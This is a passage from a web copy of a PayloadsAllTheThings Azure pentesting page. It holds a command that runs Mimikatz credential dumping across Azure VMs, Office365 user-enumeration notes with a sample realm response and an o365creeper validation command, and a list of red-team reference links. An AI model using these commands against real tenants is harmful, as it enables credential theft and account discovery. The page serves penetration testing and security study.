</span><span class="n">Invoke-AzureRmVMBulkCMD</span><span class="w"> </span><span class="nt">-Script</span><span class="w"> </span><span class="nx">Mimikatz.ps1</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w"> </span><span class="nt">-output</span><span class="w"> </span><span class="nx">Output.txt</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="office365---enumerating-users">Office365 - Enumerating Users</h2>

<p>NOTE: By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute.</p>

<ul>
  <li>Bruteforce user enum : https://bitbucket.org/grimhacker/office365userenum/src/master/ based on the endpoint https://login.microsoftonline.com/getuserrealm.srf?login=firstname.lastname@domain.com&amp;xml=1
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">RealmInfo</span><span class="w"> </span><span class="nx">Success</span><span class="o">=</span><span class="s2">"true"</span><span class="err">&gt;</span><span class="w">
  </span><span class="err">&lt;</span><span class="n">State</span><span class="err">&gt;</span><span class="nx">3</span><span class="err">&lt;</span><span class="nx">/State</span><span class="err">&gt;</span><span class="w">
  </span><span class="err">&lt;</span><span class="n">UserState</span><span class="err">&gt;</span><span class="nx">2</span><span class="err">&lt;</span><span class="nx">/UserState</span><span class="err">&gt;</span><span class="w">
  </span><span class="err">&lt;</span><span class="n">Login</span><span class="err">&gt;</span><span class="nx">firstname.lastname</span><span class="err">@</span><span class="nx">domain.com</span><span class="err">&lt;</span><span class="nx">/Login</span><span class="err">&gt;</span><span class="w">
  </span><span class="err">&lt;</span><span class="n">NameSpaceType</span><span class="err">&gt;</span><span class="nx">Federated</span><span class="err">&lt;</span><span class="nx">/NameSpaceType</span><span class="err">&gt;</span><span class="w">
  </span><span class="err">&lt;</span><span class="n">DomainName</span><span class="err">&gt;</span><span class="nx">domain.com</span><span class="err">&lt;</span><span class="nx">/DomainName</span><span class="err">&gt;</span><span class="w">
  </span><span class="err">&lt;</span><span class="n">FederationGlobalVersion</span><span class="err">&gt;</span><span class="nt">-1</span><span class="err">&lt;</span><span class="nx">/FederationGlobalVersion</span><span class="err">&gt;</span><span class="w">
  </span><span class="err">&lt;</span><span class="n">AuthURL</span><span class="err">&gt;</span><span class="w">
  </span><span class="n">https://fws.domain.com/o365/visfed/intrdomain/se/</span><span class="nf">?</span><span class="nx">username</span><span class="o">=</span><span class="nx">firstname.lastname</span><span class="o">%</span><span class="nx">40domain.com</span><span class="o">&amp;</span><span class="nx">wa</span><span class="o">=</span><span class="n">wsignin1.0</span><span class="o">&amp;</span><span class="nx">wtrealm</span><span class="o">=</span><span class="n">urn</span><span class="o">%</span><span class="nx">3afederation</span><span class="o">%</span><span class="nx">3aMicrosoftOnline</span><span class="o">&amp;</span><span class="nx">wctx</span><span class="o">=</span><span class="w">
  </span><span class="err">&lt;</span><span class="n">/AuthURL</span><span class="err">&gt;</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Validate email : https://github.com/LMGsec/o365creeper <code class="language-plaintext highlighter-rouge">o365creeper.py -f emails.txt -o validemails.txt</code></li>
  <li>Extract email lists with a valid credentials : https://github.com/nyxgeek/o365recon</li>
</ul>

<h2 id="references">References</h2>

<ul>
  <li><a href="https://www.gracefulsecurity.com/an-introduction-to-penetration-testing-azure/">An introduction to penetration testing Azure - Graceful Security</a></li>
  <li><a href="https://blog.netspi.com/running-powershell-scripts-on-azure-vms/">Running Powershell scripts on Azure VM - Netspi</a></li>
  <li><a href="https://blog.netspi.com/attacking-azure-cloud-shell/">Attacking Azure Cloud shell - Netspi</a></li>
  <li><a href="https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/">Maintaining Azure Persistence via automation accounts - Netspi</a></li>
  <li><a href="https://www.smartspate.com/detecting-an-attacks-on-active-directory-with-azure/">Detecting an attacks on active directory with Azure - Smartspate</a></li>
  <li><a href="https://www.youtube.com/watch?v=l_pnNpdxj20">Azure AD Overview</a></li>
  <li><a href="https://www.youtube.com/watch?v=IcSATObaQZE">Windows Azure Active Directory in plain English</a></li>
  <li><a href="https://medium.com/@kamran.bilgrami/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f">Building Free Active Directory Lab in Azure - @kamran.bilgrami</a></li>
  <li><a href="https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a">Attacking Azure/Azure AD and introducing Powerzure - SpecterOps</a></li>
  <li><a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">Azure AD connect for RedTeam - @xpnsec</a></li>
  <li><a href="https://blog.netspi.com/azure-privilege-escalation-using-managed-identities/">Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020</a></li>
  <li><a href="https://www.lares.com/hunting-azure-admins-for-vertical-escalation/">Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020</a></li>
  <li><a href="https://dirkjanm.io/introducing-roadtools-and-roadrecon-azure-ad-exploration-framework/">Introducing ROADtools - The Azure AD exploration framework - Dirk-jan Mollema</a></li>
  <li><a href="https://medium.com/@talthemaor/moving-laterally-between-azure-ad-joined-machines-ed1f8871da56">Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020</a></li>
  <li><a href="https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html">AZURE AD INTRODUCTION FOR RED TEAMERS - Written by Aymeric Palhière (bak) - 2020-04-20</a></li>
  <li><a href="https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/">Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter</a></li>
</ul>


      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        
        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/methodology-and-resource/'>Methodology and Resource</a>,
            <a href='/categories/cloud/'>Cloud</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/azure/"
            class="post-tag no-text-decoration" >Azure</a>
          
          <a href="/tags/cloud/"
            class="post-tag no-text-decoration" >Cloud</a>
          
          <a href="/tags/azure/"
            class="post-tag no-text-decoration" >Azure</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          
          <div class="license-wrapper">
            This post is licensed under
            <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
            by the author.
          </div>
          

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Azure - PayloadsAllTheThings&url=http://localhost:4000/Cloud-Azure-Pentest/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Azure - PayloadsAllTheThings&u=http://localhost:4000/Cloud-Azure-Pentest/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=Azure - PayloadsAllTheThings&url=http://localhost:4000/Cloud-Azure-Pentest/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink()"
        data-toggle="tooltip" data-placement="top" title="Copy link"></i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->

<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  
    <!-- BS-toc.js will be loaded at medium priority -->
    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
      <span class="pl-3 pt-2 mb-2">Contents</span>
      <nav id="toc" data-toggle="toc"></nav>
    </div>
  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/Cloud-AWS-Pentest/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    May  1, 2021
  

  <i class="unloaded">2021-05-01T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>AWS</h3>
            <div class="text-muted small">
              <p>
                





                
  Amazon Web Services offers reliable, scalable, and inexpensive cloud computing services.


Summary


  AWS
    
      Summary
      Training
      Tools
      AWS Patterns
      AWS - Metadata S...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/Reverse-Shell-Cheatsheet/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Apr 26, 2021
  

  <i class="unloaded">2021-04-26T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Reverse Shell Cheat Sheet</h3>
            <div class="text-muted small">
              <p>
                





                Summary


  Reverse Shell
    
      Awk
      Automatic Reverse Shell Generator
      Bash TCP
      Bash UDP
      C
      Dart
      Golang
      Groovy Alternative 1
      Groovy
      Java Alt...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/Windows-Download-and-Execute/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Mar  7, 2019
  

  <i class="unloaded">2019-03-07T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Windows - Download and execute methods</h3>
            <div class="text-muted small">
              <p>
                





                Downloaded files location


  C:\Users&lt;username&gt;\AppData\Local\Microsoft\Windows\Temporary Internet Files\
  C:\Users&lt;username&gt;\AppData\Local\Microsoft\Windows\INetCache\IE&lt;subdir&gt...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/SAML-Injection/" class="btn btn-outline-primary"
    prompt="Older">
    <p>SAML Injetion</p>
  </a>
  

  
  <a href="/NoSQL-Injection/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>NoSQL Injection</p>
  </a>
  

</div>


    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2022
        <a href="https://twitter.com/Zxce3_">Zxce3</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        Powered by
        <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
        with
        <a href="https://github.com/cotes2020/jekyll-theme-chirpy"
          target="_blank" rel="noopener">Chirpy</a>
        theme.
      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="http://localhost:4000{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


  </body>

</html>

